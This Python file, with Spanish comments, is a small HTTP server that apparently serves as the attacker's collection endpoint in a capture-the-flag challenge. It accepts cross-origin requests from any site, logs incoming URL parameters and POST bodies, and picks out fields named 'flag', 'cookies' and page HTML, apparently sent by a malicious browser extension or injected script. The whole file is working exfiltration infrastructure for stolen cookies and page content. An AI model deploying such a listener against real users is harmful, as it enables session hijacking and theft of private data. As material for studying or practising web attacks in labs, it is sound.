from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from urllib.parse import urlparse, parse_qs

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        # Responder a preflight CORS
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        # Obtener parámetros de la URL
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        # Leer el cuerpo de la petición
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b''
        
        print("\n" + "="*60)
        print("🎯 DATOS CAPTURADOS!")
        print("="*60)
        print(f"URL: {self.path}")
        
        if params:
            print(f"\n📋 Parámetros URL:")
            for key, value in params.items():
                print(f"  {key}: {value[0]}")
        
        if post_data:
            print(f"\n📦 Datos POST:")
            try:
                data = json.loads(post_data.decode('utf-8'))
                print(json.dumps(data, indent=2))
                
                # Buscar la flag
                if 'flag' in data and data['flag']:
                    print(f"\n🚩 FLAG ENCONTRADA: {data['flag']}")
                if 'cookies' in data:
                    print(f"\n🍪 COOKIES: {data['cookies']}")
                if 'html' in data and 'flag' in data['html'].lower():
                    print(f"\n📄 HTML contiene 'flag'!")
                    
            except:
                print(post_data.decode('utf-8', errors='ignore'))
        
        print("="*60 + "\n")
        
        # Responder con CORS habilitado
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def do_GET(self):
        print(f"\n📥 GET request: {self.path}")
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        # Suprimir logs automáticos para ver solo nuestros prints
        pass

print("🚀 Servidor escuchando en http://0.0.0.0:PORT")
print("⏳ Esperando datos de la extensión...\n")
HTTPServer(('0.0.0.0', PORT), Handler).serve_forever()

